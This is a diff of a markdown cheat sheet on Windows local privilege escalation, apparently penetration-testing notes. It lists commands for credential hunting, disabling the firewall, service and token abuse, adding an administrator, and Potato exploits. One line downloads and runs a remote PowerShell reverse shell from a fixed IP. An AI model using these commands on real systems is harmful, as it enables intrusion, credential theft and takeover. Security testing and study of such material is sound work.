@@ -1,7 +1,3 @@
----
-description: LPE Windows
----
-
 # LPE windows
 
 ## Tools
@@ -9,7 +5,7 @@ description: LPE Windows
 POWERSHELL
 
 * [https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)
-* [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) PowerUp PowerView
+* [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (PowerUp)
 * [https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)
 * [https://github.com/absolomb/WindowsEnum](https://github.com/absolomb/WindowsEnum)
 
@@ -34,7 +30,7 @@ EXE CLASSIC
 
 OS name, arch, and version
 
-```bash
+```bat
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 wmic os get lastbootuptime
 wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
@@ -46,14 +42,14 @@ C:\WINDOWS\System32\drivers\etc\hosts
 
 List all env variables
 
-```bash
+```bat
 set
 Get-ChildItem Env: | ft Key,Value
 ```
 
 List all drives
 
-```bash
+```bat
 wmic logicaldisk get caption || fsutil fsinfo drives
 wmic logicaldisk get caption,description,providername
 Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
@@ -63,21 +59,21 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 
 Get current username
 
-```bash
+```bat
 echo %USERNAME% || whoami
 $env:username
 ```
 
 List user privilege
 
-```bash
+```bat
 whoami /priv
 whoami /groups
 ```
 
 List all users
 
-```bash
+```bat
 qwinsta
 net user
 whoami /all
@@ -88,13 +84,13 @@ Get-ChildItem C:\Users -Force | select Name
 
 List logon requirements; useable for bruteforcing
 
-```bash
+```bat
 net accounts
 ```
 
 Get details about a user \(i.e. administrator, admin, current user\)
 
-```bash
+```bat
 net user administrator
 net user admin
 net user %USERNAME%
@@ -102,14 +98,14 @@ net user %USERNAME%
 
 List all local groups
 
-```bash
+```bat
 net localgroup
 Get-LocalGroup | ft Name
 ```
 
 Get details about a group \(i.e. administrators\)
 
-```bash
+```bat
 net localgroup administrators
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
@@ -119,7 +115,7 @@ Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
 
 List all network interfaces, IP, and DNS.
 
-```bash
+```bat
 ipconfig /all
 Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
 Get-DnsClientServerAddress -AddressFamily IPv4 | ft
@@ -127,27 +123,27 @@ Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 
 List current routing table
 
-```bash
+```bat
 route print
 Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
 ```
 
 List the ARP table
 
-```bash
+```bat
 arp -A
 Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
 ```
 
 List all current connections
 
-```bash
+```bat
 netstat -ano
 ```
 
 List firewall state and current configuration
 
-```bash
+```bat
 netsh advfirewall firewall dump
 
 netsh advfirewall firewall show rule name=all
@@ -159,26 +155,26 @@ netsh firewall show config
 
 List firewall's blocked ports
 
-```bash
+```bat
 $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
 ```
 
 Disable firewall
 
-```bash
+```bat
 netsh firewall set opmode disable
 netsh advfirewall set allprofiles state off
 ```
 
 List all network shares
 
-```bash
+```bat
 net share
 ```
 
 SNMP Configuration
 
-```bash
+```bat
 reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
 Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 ```
@@ -187,7 +183,7 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 
 ### Tools
 
-```bash
+```bat
 - Seatbelt.exe
 
 - PowerSploit
@@ -205,9 +201,9 @@ post/windows/gather/credentials/gpp
 
 ### Group Policy Preferences
 
-```bash
-C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
-\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
+```bat
+dir C:\ProgramData\Microsoft\Group Policy\History\<DOMAIN>\Machine\Preferences\Groups\Groups.xml
+dir \\<DOMAIN>\SYSVOL\\Policies\<DOMAIN>\MACHINE\Preferences\Groups\Groups.xml
 
 Services\Services.xml
 ScheduledTasks\ScheduledTasks.xml
@@ -218,7 +214,7 @@ DataSources\DataSources.xml
 
 ### Unattended Install files
 
-```bash
+```bat
 C:\Windows\Panther\Unattend.xml
 C:\Windows\Panther\Unattended.xml
 C:\Windows\Panther\Unattend\Unattended.xml
@@ -232,7 +228,7 @@ Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAct
 
 ### Credential manager
 
-```bash
+```bat
 cmdkey /list
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
@@ -243,7 +239,7 @@ Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 
 ### In file name
 
-```bash
+```bat
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 where /R C:\ user.txt
 where /R C:\ *.ini
@@ -254,7 +250,7 @@ Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction Sil
 
 ### In file content
 
-```bash
+```bat
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
@@ -270,7 +266,7 @@ C:\inetpub\wwwroot\web.config
 
 ### In registry
 
-```bash
+```bat
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
 REG QUERY HKCU /F "password" /t REG_SZ /S /K
 
@@ -291,7 +287,7 @@ Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
 
 ### In services
 
-```bash
+```bat
 https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
 Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -AllDomain -o
@@ -300,7 +296,7 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 
 ### in Powershell history
 
-```bash
+```bat
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -312,7 +308,7 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 
 ### Tools
 
-```bash
+```bat
 - SeatBelt.exe
 - SharpUp.exe
 
@@ -327,7 +323,7 @@ Write-ServiceBinary
 
 ### Manual exploit Binary Path
 
-```bash
+```bat
 sc qc upnphost
 sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
 sc config upnphost obj= ".\LocalSystem" password= ""
@@ -337,7 +333,7 @@ net start upnphost
 
 ### Unquoted Service Paths
 
-```bash
+```bat
 # Using PowerSploit
 Get-ServiceUnquoted
 Write-ServiceBinary -Name "GDCAgent' -Path "C:\GDCAgent.exe"
@@ -361,7 +357,7 @@ SharpUp PowerUp
 
 ### AlwaysInstallElevated
 
-```bash
+```bat
 # manual cmd
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -374,7 +370,7 @@ Write-UserAddMSI
 
 ### What is running
 
-```bash
+```bat
 tasklist /v
 tasklist /v /fi "username eq system"
 tasklist /SVC
@@ -388,7 +384,7 @@ Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "sv
 
 ### Scheduled task
 
-```bash
+```bat
 sc qc
 schtasks /query /fo LIST /v /s <remote_computername>
 schtasks /query /fo LIST 2>nul | findstr TaskName
@@ -399,7 +395,7 @@ Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,Tas
 
 ### Startup services
 
-```bash
+```bat
 wmic startup get caption,command
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
@@ -420,7 +416,7 @@ Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup
 
 ### Permissions
 
-```bash
+```bat
 dir /a "C:\Program Files"
 dir /a "C:\Program Files (x86)"
 reg query HKEY_LOCAL_MACHINE\SOFTWARE
@@ -447,7 +443,7 @@ accesschk.exe -ucqv Spooler
 
 Interesting permissions to get shell
 
-```bash
+```bat
 SERVICE_CHANGE_CONFIG (reconfigure binary)
 WRITE_DAC (reconfigure permissions)
 WRITE_OWNER (become owner, change permission)
@@ -459,7 +455,7 @@ GENEROC_ALL (inherits SERVICE_CHANGE_CONFIG)
 
 ### Tools
 
-```bash
+```bat
 - msf
 post/windows/gather/enum_patches
 
@@ -472,7 +468,7 @@ Find-AllVulns
 
 ### Manual discovery
 
-```bash
+```bat
 wmic qfe
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
@@ -488,7 +484,7 @@ Example: "Windows Help and Support" \(Windows + F1\), search for "command prompt
 
 Tools
 
-```bash
+```bat
 - Rubeus.exe 
 
 - Priv checklist
@@ -504,27 +500,30 @@ https://github.com/itm4n/FullPowers
 
 * exe
 
-  [https://github.com/foxglovesec/Potato](https://github.com/foxglovesec/Potato)
+[https://github.com/foxglovesec/Potato](https://github.com/foxglovesec/Potato)
 
-  ```bash
+```bat
   Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
-  ```
+```
 
 * powershell 
 
-  [https://github.com/Kevin-Robertson/Tater](https://github.com/Kevin-Robertson/Tater)
+[https://github.com/Kevin-Robertson/Tater](https://github.com/Kevin-Robertson/Tater)
 
-  ```bash
-  Invoke-Tater -Command "net localgroup administrators user /add"
-  ```
+```bat
+Invoke-Tater -Command "net localgroup administrators user /add"
+```
 
 ### RottenPotato
 
 **Token Impersonation**
 
-[https://github.com/foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato) [https://github.com/breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)
+- [https://github.com/foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato) 
+- [https://github.com/breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)
 
-```bash
+Incognito (Meterpreter)
+
+```bat
 getuid
 getprivs
 use incognito
@@ -533,13 +532,15 @@ cd c:\temp\
 execute -Hc -f ./rot.exe
 impersonate\_token "NT AUTHORITY\SYSTEM"
 ```
+TokenManipulation
 
-```bash
+```bat
 Invoke-TokenManipulation -Enumerate
 Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
 Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
 ```
+> For more information, see next cheatsheet Domain Escalation
 
 ### Juicy Potato
 
@@ -547,7 +548,7 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 
 [https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases) Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +.
 
-```bash
+```bat
 Check the privileges of the service account, you should look for SeImpersonate and/or SeAssignPrimaryToken (Impersonate a client after authentication)
 
 whoami /priv
@@ -577,7 +578,7 @@ JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-45
 
 Tools
 
-```bash
+```bat
 - find missing dll
 https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx
 
@@ -590,7 +591,7 @@ Write-HijackDll
 exploit/windows/local/ikeext_service
 ```
 
-```bash
+```bat
 dll missing search paths order :
     The directory from which the application is loaded
     C:\Windows\System32
@@ -601,13 +602,13 @@ dll missing search paths order :
     Directories in the user PATH environment variable
 ```
 
-```bash
+```bat
 icacls C:\Perl64
 ```
 
 ## Vulnerable Drivers
 
-```bash
+```bat
 https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery
 
 driverquery
@@ -619,13 +620,13 @@ DriverQuery.exe --no-msft
 
 Tools
 
-```bash
+```bat
 - SeatBelt.exe
 ```
 
 Manual
 
-```bash
+```bat
 Find named pipes: [System.IO.Directory]::GetFiles("\\.\pipe\")
 Check named pipes DACL: pipesec.exe <named_pipe>
 Reverse engineering software
@@ -634,7 +635,9 @@ Send data throught the named pipe : program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\
 
 ## Refs
 
-[https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection) [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation) [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+- [https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection) 
+- [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation) 
+- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
 ## To check
 
